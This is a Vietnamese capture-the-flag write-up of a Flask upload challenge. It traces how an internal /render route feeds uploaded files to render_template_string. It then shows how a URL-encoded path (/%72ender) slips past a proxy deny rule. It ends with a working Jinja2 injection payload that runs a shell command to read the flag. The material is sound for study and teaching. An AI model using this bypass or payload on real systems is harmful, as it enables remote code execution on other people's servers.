- SSTI.

- Đầu tiên ta nhìn luồng hoạt động của website:

    ○ Tạo ngẫu nhiên 1 path: ```uploads/<folder_name>/```
    
    
    ```python
    @app.before_request
    def log_request_info():
        logger.info(f"REQUEST: {request.method} {request.path}")
        if 'folder' not in session:     # Nếu session 'folder' chưa có
            folder_name = uuid.uuid4().hex     # Tạo 'folder_name' 
            session['folder'] = folder_name    
            session_folder_path = os.path.join(BASE_UPLOAD_FOLDER, folder_name)     #Tạo thư mục 'uploads/<folder_name>'
            os.makedirs(session_folder_path, exist_ok=True)
        else:
            session_folder_path = os.path.join(BASE_UPLOAD_FOLDER, session['folder'])
        app.config['UPLOAD_FOLDER'] = session_folder_path   # Đường dẫn thư mục cụ thể của session
    ```
    
    ○ Trang web chức năng upload file '.html', '.txt' ở đường dẫn ```/upload``` (file được lưu ở ```'uploads/<folder_name>/<file_name>'``` với file name được random ngẫu nhiên
    
    ```python
    @app.route('/upload', methods=['GET', 'POST'])
    def upload_file():      # Chỉ cho phép extension là '.txt' với '.html'
        if request.method == 'POST':
            if 'file' not in request.files:
                return "No file part"
            file = request.files['file']
            if file.filename == '':
                return "No selected file"
            if file and allowed_file(file.filename):
                ext = file.filename.rsplit('.', 1)[1].lower()
                random_str = uuid.uuid4().hex[:16]     
                filename = f"{random_str}.{ext}"    #Lưu file với tên ngẫu nhiên
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                return f"File uploaded successfully! Path: {filepath} <a href='/files'>See all files</a>"
            return "File type not allowed"
        return render_template("upload.html")
    ```
    
    ○ Đọc các file đã upload ở ```/uploads/<folder_name>/<file_name>```:
    
    ```python
    @app.route('/uploads/<folder>/<filename>')
    def download_file(folder, filename):
        folder_path = os.path.join(BASE_UPLOAD_FOLDER, folder)
        return send_from_directory(     # Download file đã upload.
            folder_path,
            filename,
            mimetype='text/plain',
            as_attachment=False
        )
    ```
    
    ○ Đọc các file đã gửi ở route ```/files```:
    
    ```python
    @app.route('/files', methods=['GET'])
    def list_files():       #Liệt kê các file trong session 'folder'
        folder = session.get('folder')
        if not folder:
            folder = uuid.uuid4().hex
            session['folder'] = folder
        folder_path = os.path.join(BASE_UPLOAD_FOLDER, folder)
        os.makedirs(folder_path, exist_ok=True) 
        files = os.listdir(folder_path)
        file_urls = [f"uploads/{folder}/{f}" for f in files]
        return render_template("files.html", files=zip(files, file_urls))
    ```

    ○ Ứng dụng sẽ render nội bộ nội dung của file đã upload lên ở ```/render```:
    
    ```python
    # Internal access to render
    @app.route('/render')       
    def render_file():
        filepath = request.args.get("filepath", "") 
        if not os.path.isfile(filepath):
            return "File not found", 404
        with open(filepath) as f:
            content = f.read()      # Mở file tùy ý mà không qua sandbox nào rồi gọi render luôn --> SSTI!!!
        return render_template_string(f"<pre>{ content }</pre>")
    ```

    --> SSTI ở đây.
    
Nhưng ta có 1 vấn đề ở đây là khi ta vào route ```render```, sẽ bị proxy chặn lại và chuyển qua ```/internal``` vì file ```remap.config```:
    
    ```text
    map /render http://gunicorn-server:8088/internal @action=deny @method=post @method=get    # deny mọi request tới /render...
    map / http://gunicorn-server:8088/
    ```
    
- Sự khác biệt giữa Proxy và Server:
    ○ Proxy: Khi nhận request chứa encode như ```'/%72ender?...'```, proxy chỉ so khớp theo pattern đơn giản nên không nhận diện đây là endpoint ```'/render'``` 

    ○ Server: Khi nhận request, sẽ fully URL decode và định tuyến tới endpoint ```'/render'``` chính xác.

- File html: ```{{ cycler.__init__.__globals__.os.popen('cat /flag_*').read() }}```